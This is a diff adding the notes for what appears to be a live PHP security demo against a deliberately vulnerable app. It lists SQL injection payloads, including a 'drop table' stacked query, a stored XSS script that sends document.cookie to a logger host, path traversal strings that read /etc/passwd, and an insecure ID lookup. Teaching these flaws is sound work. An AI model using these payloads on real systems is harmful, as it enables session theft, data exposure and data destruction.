@@ -1,0 +1,32 @@
+Steps:
+1. Login -- HTTPS!!
+login:
+test' or '1'='1
+
+2. SQL Injection - UserFilter
+	http://sydphp/?username=jared'%20or%20'1'='1
+	http://sydphp/?username=jared'%20or%20''='
+	http://sydphp/index.php?id=1%20or%201=1
+	http://sydphp/?id=1;drop table invoices -- doesn't work because mysql_query stacked query support -- but will work with other dbs
+	# -- stops queries running
+
+3. Plain text passwords
+
+4. Plain text credit card details -- PCI compliance
+
+5. XSS -- simple alert
+
+6. Session Hijacking -- Taking advantage of XSS
+message:
+Session Hijacking
+Hey just wanted to say that you guys rock!
+<script>
+new Image().src="http://sydphp-logger/?c="+encodeURI(document.cookie);
+</script>
+
+read file:
+../../../../etc/passwd
+../../../../etc/passwd%00
+
+
+7. Not checking user permissions ?id=12 -- can change the id field and access anybodies information
